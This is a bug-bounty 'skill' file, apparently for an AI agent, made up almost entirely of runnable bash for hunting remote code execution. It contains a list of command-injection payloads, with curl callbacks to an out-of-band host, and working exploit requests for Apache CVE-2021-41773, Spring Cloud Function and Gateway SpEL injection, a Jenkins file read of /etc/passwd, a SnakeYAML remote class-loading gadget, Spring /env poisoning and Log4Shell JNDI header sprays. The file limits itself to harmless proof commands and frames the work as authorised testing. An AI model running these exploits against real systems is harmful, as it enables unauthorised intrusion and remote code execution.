---
name: k1nzr3c0n-hunt-rce
description: "RCE hunting skill built from 67 disclosed bug bounty reports. Covers template injection polyglot, CVE-2021-41773 (Apache), CVE-2022-22963 (Spring SpEL), CVE-2024-23897 (Jenkins), SnakeYAML gadgets, PHP filter chain, deserialization chains, command injection in shell-calling parameters."
tags: [rce, command-injection, hunt, web-security, bug-bounty]
report_count: 67
---

# K1NZR3C0N Hunt — RCE / Command Injection

> **Prove execution**: show `id` or `whoami` output in response. DNS callback alone = SSRF, not RCE.
> **Safe payloads**: `sleep 5`, `id`, `whoami`, `hostname` — never destructive commands in scope tests.

---

## Crown Jewels

```
Priority 1 — Direct command injection in OS-shell-calling parameters
Priority 2 — SSTI → RCE (Jinja2, Freemarker, ERB)
Priority 3 — Deserialization RCE (Java, PHP, Python pickle)
Priority 4 — CVE in identified stack (Jenkins, Spring, Apache)
Priority 5 — YAML deserialization (SnakeYAML gadgets)
```

---

## Phase 0 — Bootstrap

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_rce_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"
OOB="${OOB:-$(openssl rand -hex 6).oastify.com}"
echo "[+] OOB: $OOB"

# RCE candidate endpoints from recon
RUNS_BASE="/app/runs"
# Look for parameters that suggest OS shell interaction
grep -rhoP 'https?://[^\s"]+[?&](?:cmd|exec|command|run|ping|host|ip|addr|system|shell|proc|process|eval|code|script|path|file|url|redirect|input|query|search|debug|test)=[^\s&"]+' \
  "$RUNS_BASE" 2>/dev/null | sort -u | tee "$HUNT/rce_candidates.txt" | wc -l \
  | xargs echo "RCE candidates:"
```

## Phase 1 — Command Injection

```bash
echo "=== Command Injection Testing ==="
ENDPOINT="${RCE_ENDPOINT:-}"
PARAM="${RCE_PARAM:-host}"

PROBE_ID=$(openssl rand -hex 4)

# Shell metacharacter injection payloads
CI_PAYLOADS=(
  "; id"
  "| id"
  "& id"
  "\`id\`"
  '$(id)'
  "; sleep 5"
  "| sleep 5"
  # URL-encoded variants
  "%3B+id"
  "%7C+id"
  "%26+id"
  # Newline injection
  $'\nid\n'
  # OOB via curl
  "; curl http://${PROBE_ID}.${OOB}/rce"
  "| curl http://${PROBE_ID}.${OOB}/rce"
  '$(curl http://'"${PROBE_ID}.${OOB}"'/rce)'
)

for P in "${CI_PAYLOADS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$P" 2>/dev/null)
  RESP=$(curl -sk -m 8 "${ENDPOINT}${ENCODED}" 2>/dev/null)
  
  # Check for id/whoami output
  echo "$RESP" | grep -oP 'uid=\d+\([^)]+\)' && \
    echo "  [CI-RCE] PAYLOAD: ${P:0:30}"
  
  # Check timing (sleep detection)
  T=$(curl -sk -o /dev/null -w '%{time_total}' -m 10 "${ENDPOINT}${ENCODED}" 2>/dev/null)
  python3 -c "import sys; t=float('$T'); sys.exit(0 if t>=4 else 1)" 2>/dev/null && \
    echo "  [CI-TIMING ${T}s] ${P:0:30} — run 10 more trials"
done
```

## Phase 2 — CVEs (Identified Stack)

```bash
echo "=== Stack-Specific CVE Testing ==="

# ── CVE-2021-41773 / CVE-2021-42013 — Apache 2.4.49/2.4.50 RCE ───────────────
echo "--- CVE-2021-41773 Apache RCE ---"
curl -sk -X POST "https://${TARGET}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "echo;id" | grep -oP 'uid=\d+\([^)]+\)'

# ── CVE-2022-22963 — Spring Cloud Function SpEL Injection ────────────────────
echo "--- CVE-2022-22963 Spring SpEL ---"
curl -sk -X POST "https://${TARGET}/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"id\")" \
  -H "Content-Type: text/plain" \
  -d "data" | grep -oP 'uid=\d+\([^)]+\)'

# ── CVE-2024-23897 — Jenkins arbitrary file read → RCE ───────────────────────
echo "--- CVE-2024-23897 Jenkins ---"
# Step 1: read /etc/passwd via CLI
curl -sk "https://${TARGET}/jenkins/jnlpJars/jenkins-cli.jar" -o "$HUNT/jenkins-cli.jar" 2>/dev/null
[ -f "$HUNT/jenkins-cli.jar" ] && \
  java -jar "$HUNT/jenkins-cli.jar" -s "https://${TARGET}/jenkins" \
    help 1 "@/etc/passwd" 2>/dev/null | head -5

# ── CVE-2022-22947 — Spring Cloud Gateway SPEL ───────────────────────────────
echo "--- CVE-2022-22947 Spring Gateway ---"
curl -sk -X POST "https://${TARGET}/actuator/gateway/routes/pwn" \
  -H "Content-Type: application/json" \
  -d '{"id":"pwn","predicates":[{"name":"Path","args":{"pattern":"/pwn"}}],"filters":[{"name":"AddResponseHeader","args":{"name":"X-Out","value":"#{T(java.lang.Runtime).getRuntime().exec(\"id\")}"}}],"uri":"https://example.com","order":0}' \
  | python3 -m json.tool 2>/dev/null | head -5

curl -sk -X POST "https://${TARGET}/actuator/gateway/refresh" -d '' -o /dev/null
curl -sk "https://${TARGET}/pwn" -I | grep 'X-Out'
```

## Phase 3 — YAML Deserialization (SnakeYAML)

```bash
echo "=== SnakeYAML / YAML Deserialization ==="
YAML_EP="${YAML_ENDPOINT:-https://${TARGET}/api/config}"
OOB_ID=$(openssl rand -hex 4)

# SnakeYAML ClassPathXmlApplicationContext gadget
YAML_PAYLOAD="!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://${OOB_ID}.${OOB}/yaml\"]]]]"

curl -sk -X POST "$YAML_EP" \
  -H "Content-Type: application/x-yaml" \
  -d "$YAML_PAYLOAD" -o /dev/null
echo "  [!] Check OOB for: ${OOB_ID}.${OOB}"

# Spring Boot Actuator: /env + /restart to set YAML payload
echo ""
echo "Spring Boot /env poisoning:"
curl -sk -X POST "https://${TARGET}/actuator/env" \
  -H "Content-Type: application/json" \
  -d '{"name":"spring.cloud.bootstrap.location","value":"http://'"${OOB_ID}.${OOB}"'/application.yaml"}' \
  | head -5
```

## Phase 4 — Log4Shell (CVE-2021-44228)

```bash
echo "=== Log4Shell Detection ==="
PROBE_ID=$(openssl rand -hex 4)
L4J_PAYLOAD="\${jndi:ldap://${PROBE_ID}.${OOB}/log4shell}"

# Inject in all user-controlled headers
for HEADER in "User-Agent" "X-Forwarded-For" "X-Api-Version" "Referer" "X-Custom-IP-Authorization" "X-Originating-IP" "X-Remote-IP" "X-Remote-Addr"; do
  curl -sk "https://${TARGET}/" \
    -H "${HEADER}: ${L4J_PAYLOAD}" -o /dev/null
  echo "  Tested: $HEADER"
done
echo "  [!] Check OOB: ${PROBE_ID}.${OOB}"
echo "  [NOTE] Log4j 2.17.1+ patched; assess target version first"
```

## Phase 5 — Gate 0

```bash
echo "=== RCE Gate 0 ==="
echo "  □ Command output in response (uid=33(www-data) etc.)"
echo "  □ If timing-based: n≥10 trials, mean ≥4s for sleep(5)"
echo "  □ OOB: HTTP callback with command output in URL path"
echo "  □ CVE: confirm target version is vulnerable before reporting"
echo "  □ Payload is safe (id/whoami/hostname — NOT rm/shutdown)"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
RCE via Command Injection in [?cmd= parameter] on [/api/ping] — confirmed with 'id' output: uid=33(www-data)
CVE-2022-22963 Spring Cloud Function SpEL Injection on [target] — unauthenticated RCE
SSTI in [name field] via Jinja2 escalates to RCE (see /skill k1nzr3c0n-hunt-ssti)
```
